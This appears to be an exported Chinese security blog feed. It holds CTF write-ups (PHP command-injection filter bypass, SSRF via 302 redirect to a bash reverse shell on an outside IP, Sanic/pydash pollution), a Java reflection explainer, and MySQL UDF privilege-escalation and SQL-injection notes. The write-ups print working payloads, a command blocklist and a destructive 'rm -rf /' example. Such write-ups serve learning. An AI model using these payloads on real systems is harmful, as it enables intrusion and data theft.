class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**：设置 <code>open_basedir</code> 配置选项，限制 PHP 只能访问 <code>/var/www/html/</code> 目录及其子目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><code>**escapeshellcmd**</code> 是一个 PHP 内置函数，用于转义传递给 shell 的字符串，以防止命令注入攻击。它的主要作用是确保用户输入的字符串在作为 shell 命令的一部分执行时不会被解释为特殊字符或命令。这个函数会在某些有特殊含义的字符前添加反斜杠，从而使这些字符失去特殊含义。</p>
<p>eg:</p>
<p>假设有以下用户输入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>使用 <code>escapeshellcmd</code> 转义后：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure>

<p>输出将会是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure>

<p>而且这里过滤了很多东西</p>
<p>跟着wp复现</p>
<p><code>php -r</code> 是 PHP 命令行界面（CLI）的一部分，它允许你直接在命令行中运行 PHP 代码，而无需创建一个文件来包含这些代码。<code>-r</code> 选项用于指定一段将被执行的 PHP 代码</p>
<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p>
<p>发现可以直接执行</p>
<p>那么我们这就可以命令执行</p>
<p>由于绕过的函数有些多，我们可以使用hex2bin()函数进行16进制转字符进行绕过</p>
<p>但发现直接<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p>
<p>行不通</p>
<p>发现hex2bin需要的参数是一个字符串类型的数字，直接两个双引号呢？</p>
<p>不行 gg 准备跑路</p>
<p>但是总有大佬能想出来</p>
<p><strong>substr()</strong> 这个就有点牛逼了</p>
<p>我们知道</p>
<p><strong>自动类型转换（Type Juggling）</strong></p>
<p>PHP 是一种弱类型语言，它支持自动类型转换，称为“类型杂耍”（type juggling）。这意味着 PHP 会在需要时自动将一种数据类型转换为另一种数据类型。这种转换在函数参数传递时特别常见。</p>
<p>当你传递一个数字给 <code>substr()</code> 的 <code>$string</code> 参数时，PHP 会自动将这个数字转换为字符串。这是因为 <code>substr()</code> 函数的<strong>第一个参数需要一个字符串</strong>，而 PHP 会尝试将传递的任何数据转换为期望的类型。</p>
<p>所以我们这里payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure>

<p>成功执行 </p>
<p>查找&#x2F;目录发现没东西 但是 ps 发现有sql进程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p>
<p>爆出库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p>
<p>还有个更简单的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure>

<p>直接把所有库的所有数据查出来 然后找flag</p>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:简单的cms，可以扫扫看？ 提示1： &#x2F;flag.php： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示2：github找一下源码?</p>
<p>找到源码</p>
<p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
<p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p>
<p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p>
<p>ssrf漏洞</p>
<p>定位这个函数<strong>dr_catcher_data</strong></p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p>
<p>试了下输入本地不行</p>
<p>302跳转</p>
<p>自己vps上面构建302.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=6666&amp;level=1</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p>
<p>卡了？ 试了几次都这样 </p>
<p>gg 跑路 复现失败 ┭┮﹏┭┮</p>
<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>依旧是这位大佬gxngxngxn</p>
<p>参考</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p>进入src路由</p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>分析下这段 在&#x2F;login路由处我们需要绕过**user.lower() &#x3D;&#x3D; ‘adm;n’**的限制，由于这里是从session中读取，所以默认是会在分号处截断，直接传肯定是不行的</p>
<p>利用八进制绕过</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B926%E5%88%86.png" alt="image-20240801202640883"></p>
<p>原理之前DASCTF复现的时候讲过了</p>
<p>所以直接上操作</p>
<p>得到admin的session</p>
<p>进入admin</p>
<p>直接污染</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到flag名</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B908%E5%88%86.png" alt="image-20240801210841152"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问src 拿flag</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B910%E5%88%86.png" alt="image-20240801211003726"></p>
<h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2>]]></content>
      <categories>
        <category>ciscn</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射机制是什么？</title>
    <url>/2024/10/23/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    <content><![CDATA[<p>好久没更新自己的blog 这一个月确实太多事情了 放下了自己ctf的学习进度 话说还是边做笔记变学习有效率</p>
<h1 id="Java程序运行原理"><a href="#Java程序运行原理" class="headerlink" title="Java程序运行原理"></a>Java程序运行原理</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java程序运行原理其实本质上就是Java虚拟机与跨平台原理</span><br></pre></td></tr></table></figure>

<p>Java程序的运行过程就像“<strong>翻译官带着菜谱去不同国家的厨房做饭</strong>”，核心是<strong>跨平台执行</strong>和<strong>自动管理内存</strong>。</p>
<p><strong>1.写代码→翻译成通用菜谱 (编译)</strong><br>·你写的代码：用Java语法写好的java文件，比如一个“西红柿炒蛋”的菜谱（代码）<br>·编译成字节码：用javac命令把代码翻译成.class文件（字节码）。这相当于把中文菜谱转成“国际通用菜<br>谱”（字节码），任何国家的厨房（操作系统）都能看懂。</p>
<p><strong>关键点：</strong><br>·字节码不是机器码，而是一种中间格式，类似“通用菜谱”，需要二次翻译。<br>·跨平台的关键：每个国家（操作系统）配一个翻译官（JVM）就能用同一份菜谱</p>
<p><strong>2.厨房开工→JVM加载并执行</strong><br>·启动JVM：运行java命令时，相当于请来翻译官（JVM）进厨房。<br>·类加载器搬食材：JVM的“搬运工”（类加载器）把菜谱（字节码）和食材（类信息）搬到厨房的不同区域：<br>。方法区：存放菜谱步骤（类结构、静态变量）。<br>。堆内存：放炒菜用的锅碗瓢盆（对象实例），比如“西红柿”和“鸡蛋”对象。<br>。栈内存：记录当前炒菜的步骤（方法调用栈），比如“先热锅再倒油”。<br><strong>关键点：</strong><br>·JVM自动管理内存，不用手动清理(垃圾回收）<br>·每个线程（厨师）有自己的工作台(栈)。</p>
<p><strong>3.边炒菜边优化→解释执行&amp;即时编译(JIT)</strong><br>·解释执行：翻译官（JVM）逐行读菜谱（字节码），转成机器能执行的指令。比如“切西红柿”翻译成机器码。<br>·即时编译（JIT）：如果某步骤重复多次（比如“翻炒”），JVM会把这部分编译成机器码缓存起来，下次直接执<br>行，加快速度<br><strong>关键点：</strong><br>·解释执行适合启动快，即时编译适合长期运行的高效。<br>·类似厨师记住常用步骤，不用每次都看菜谱。</p>
<p><strong>4.收尾→垃圾回收</strong><br>·自动清理：炒完菜后，JVM的“清洁工”（垃圾回收器）会自动扔掉用过的锅（无引用的对象），腾出堆内存</p>
<p>·分代回收：新锅（新生代）和旧锅（老年代）分开清理，提高效率69。</p>
<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><p><strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过 Java 的反射机制，程序员可以更深入地控制程序的运行过程。例如，在程序运行时由用户输入一个类名，然后动态获取该类拥有的构造、属性和方法，甚至调用任意类的任意方法。</span><br></pre></td></tr></table></figure>

<p>在Java开发中，我们使用new关键字来创建一个对象，然后在程序运行的时候JVM就会相应的生成这个对象。也就是说我们一旦确定了这个类以及对象，那么就无法进行修改。</p>
<p><strong>那么可不可以在我们程序运行的时候动态的生成一个对象呢？</strong></p>
<p>当然可以。我们把Java程序在运行的时候根据需要动态生成的对象称为Java的反射机制。</p>
<p>在程序<strong>运行</strong>的时候<strong>动态</strong>创建一个类的实例<br>周用实例的方法和访问它的<strong>属性</strong></p>
<p>Java代码运行原理：<br>源码<br>编译器(javac)纟编译为字节码.class文件<br>各平台JVM解释器把字节码文件转换成操作系统<br>指令(跨平台)</p>
<p>了解下什么是反射</p>
<h2 id="Java反射机制是什么？"><a href="#Java反射机制是什么？" class="headerlink" title="Java反射机制是什么？"></a>Java反射机制是什么？</h2><p><a href="https://c.biancheng.net/java/">Java</a> 反射机制是 Java 语言的一个重要特性。在学习 Java 反射机制前，大家应该先了解两个概念，编译期和运行期。</p>
<p><strong>编译期</strong>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p>
<p><strong>运行期</strong>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p>
<p>Java 反射机制是在运行状态中，<strong><strong>对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；</strong>这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制**</strong>。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p>
<p>Java 反射机制在服务器程序和中间件程序中得到了广泛运用。在服务器端，往往需要根据客户的请求，动态调用某一个对象的特定方法。此外，在 ORM 中间件的实现中，运用 Java 反射机制可以读取任意一个 JavaBean 的所有属性，或者给这些属性赋值。</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1729667020117.png" alt="img"></p>
<p>这里的反射方式</p>
<ol>
<li><p><strong>实例化对象</strong>：</p>
<ul>
<li>在反射机制中，我们已经有了一个对象（或者不知道对象类型时），它可以是任何类的实例。</li>
</ul>
</li>
<li><p><strong>调用 <code>getClass()</code> 方法</strong>：</p>
<ul>
<li>通过调用该对象的 <code>getClass()</code> 方法，我们可以获取该对象的类类型。这种方式不需要在编写代码时提前知道对象的具体类型。</li>
</ul>
</li>
<li><p><strong>得到完整的包类名称</strong>：</p>
<ul>
<li><p>使用 <code>getClass()</code> 方法，我们可以获取该对象的完整类名，这包括其所在的包名。这对于动态处理和调试非常有用。</p>
</li>
<li><pre><code>- **正常方式**适合静态类型的语言或不需要动态处理的场景，显式类的引入和实例创建。
- **反射方式**适合需要动态类处理的场景，可以在运行时根据对象的类型做出不同的处理，提供更大的灵活性。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     Java 反射机制主要提供了以下功能，这些功能都位于`java.lang.reflect`包。</span><br><span class="line"></span><br><span class="line">     - 在运行时判断任意一个对象所属的类。</span><br><span class="line">     - 在运行时构造任意一个类的对象。</span><br><span class="line">     - 在运行时判断任意一个类所具有的成员变量和方法。</span><br><span class="line">     - 在运行时调用任意一个对象的方法。</span><br><span class="line">     - 生成动态代理。</span><br><span class="line"></span><br><span class="line">众所周知，所有 Java 类均继承了 Object 类，在 Object 类中定义了一个 getClass() 方法，该方法返回同一个类型为 Class 的对象。例如，下面的示例代码：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">Class labelCls = label1.getClass();    // label1为 JLabel 类的对象</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ol>
<p>利用 Class 类的对象 labelCls 可以访问 labelCls 对象的描述信息、JLabel 类的信息以及基类 Object 的信息。表 1 列出了通过反射可以访问的信息。</p>
<p>以下是一些 Java 反射的常见用法：</p>
<ol>
<li>获取类信息：通过 <code>Class.forName()</code> 方法获取某个类的 <code>Class</code> 对象，然后使用 <code>Class</code> 对象的各种方法获取类的信息，如 <code>getName()</code> 获取类名，<code>getDeclaredMethods()</code> 获取所有方法等。</li>
<li>创建对象：通过 <code>Class</code> 对象的 <code>getConstructor()</code> 或 <code>getDeclaredConstructor()</code> 方法获取指定构造函数的引用，然后使用 <code>newInstance()</code> 或 <code>newInstance()</code> 方法创建对象。</li>
<li>访问属性：通过 <code>Class</code> 对象的 <code>getDeclaredField()</code> 方法获取指定属性的引用，然后使用 <code>set()</code> 或 <code>get()</code> 方法设置或获取属性的值。</li>
<li>调用方法：通过 <code>Class</code> 对象的 <code>getDeclaredMethod()</code> 方法获取指定方法的引用，然后使用 <code>invoke()</code> 方法调用方法并传递参数。</li>
<li>动态代理：通过 Java 反射实现动态代理，可以在运行时创建一个实现了指定接口的代理类，并实现指定的方法逻辑。</li>
</ol>
<p>更多的可以去看<a href="https://y4er.com/posts/java-deserialization-1/">https://y4er.com/posts/java-deserialization-1/</a></p>
<p>我觉得写的还行的</p>
<p>什么是反射？反射之中包含了一个「反」字，所以想要解释反射就必须先从「正」开始解释。</p>
<p>我们先来看一段代码</p>
<table>
<thead>
<tr>
<th><strong><code>1  </code></strong></th>
<th><strong><code>fanshe testObj = new fanshe();  </code></strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>2</code></strong></td>
<td><strong><code>testObj.setPrice(5);</code></strong></td>
</tr>
</tbody></table>
<p>很简单，就是通过new创建了一个<code>fanshe</code>类的对象<code>testObj</code>，这是[正射]。在这个实例化的过程中，我们需要知道类名，<strong>那么实际开发中如果我们不确定类名的话就没办法<code>new</code>一个实例了，为此java搞了一个反射出来。</strong></p>
<p>所以反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL UDF提权</title>
    <url>/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>udf 全称为’user defined function’，意思是’用户自定义函数’。用户可以对<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库</a>所使用的函数进行一个扩展（windows利用dll文件，linux利用so文件），那么我们就可以利用这个特点，往MySQL里面添加一个可以执行系统命令的函数即可。</p>
<p>UDF 提权就像 <strong>“利用数据库给自己开后门”</strong>。举个例子：假设你偷偷在公司的打卡机里装了一个小程序，这个小程序本来应该只用来记录考勤，但你把它改成了能直接开老板办公室的门禁卡——这就是 UDF 提权的核心逻辑。</p>
<p>数据库就像一台手机，UDF 就是用户自己安装的 App。正常 App 用来听歌、聊天，但黑客装的 App 其实是偷密码的间谍软件</p>
<h2 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a>二、利用条件</h2><h4 id="1、常规情况："><a href="#1、常规情况：" class="headerlink" title="1、常规情况："></a>1、常规情况：</h4><p>1.1 mysql配置文件secure_file_priv项设置为空，（如果为NULL或&#x2F;tmp&#x2F;等指定目录，即无法自定义udf文件导出位置，则无法利用）；</p>
<p>1.2 CREATE权限、FILE权限（root用户默认拥有所有权限）。</p>
<h4 id="2、特殊情况："><a href="#2、特殊情况：" class="headerlink" title="2、特殊情况："></a>2、特殊情况：</h4><p>2.1 INSERT权限、UPDATE权限、DELETE权限。</p>
<h4 id="提权步骤（简单版）"><a href="#提权步骤（简单版）" class="headerlink" title="提权步骤（简单版）"></a><strong>提权步骤（简单版）</strong></h4><p><strong>传文件</strong>：把恶意代码（比如 <code>udf.so</code>）传到服务器上，比如通过数据库的“文件写入”功能</p>
<p><strong>导文件</strong>：用 SQL 命令把文件复制到数据库的“插件目录”</p>
<p><strong>造函数</strong>：在数据库里创建一个“自定义函数”，绑定这个恶意代码</p>
<p><strong>执行命令</strong>：调用这个函数执行系统命令（比如 <code>chmod u+s /usr/bin/find</code>），直接拿到 root 权限</p>
<p>等碰到响应靶机 再去做复现执行 现在先简单了解一下</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF</title>
    <url>/2024/08/06/NSSCTF-sql/</url>
    <content><![CDATA[<h1 id="HNCTF-2022-WEEK2-easy-sql"><a href="#HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="[HNCTF 2022 WEEK2]easy_sql"></a>[HNCTF 2022 WEEK2]easy_sql</h1><p>参考文章：<a href="https://blog.csdn.net/Jayjay___/article/details/132956781">https://blog.csdn.net/Jayjay___/article/details/132956781</a></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这题考察了无列名注入</p>
<p>我们常用的<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>方法是通过<code>information_schema</code>这个默认数据库来实现，可是你有没有想过，如果过滤了该数据库那么我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p>
<p><strong>InnoDb引擎</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表（mysql.innodb_table_stats），这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure>

<p><strong>sys数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns（sys.schema_auto_increment_columns）来获取表名。</span><br></pre></td></tr></table></figure>

<p>但是上述两种方法都只能查出表名，<strong>无法查到列名</strong>，这时我们就要用到无列名注入了。无列名注入，顾名思义，就是不需要列名就能注出数据的注入。</p>
<p><strong>无列名注入使用条件</strong></p>
<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，<strong>information_schema 库被过滤</strong>，使用这种方法获取列名。</p>
<p><strong>无列名注入原理</strong></p>
<p>无列名注入的原理其实很简单，就是联合查询<strong>创建虚拟数据</strong>。<strong>可以看作将我们不知道的列名进行取别名操作</strong>，在取别名的同时进行数据查询，所以查询字段数一定要相同，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
<h2 id="本地演示"><a href="#本地演示" class="headerlink" title="本地演示"></a>本地演示</h2><p>正常查表</p>
<p> select * from Gu0f3n;<br><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B903%E5%88%86.png" alt="image-20240806200233160"></p>
<p>联合查询表中数据</p>
<p>select 1,2,3 union select * from Gu0f3n;(我这里字段是三，具体情况具体分析)</p>
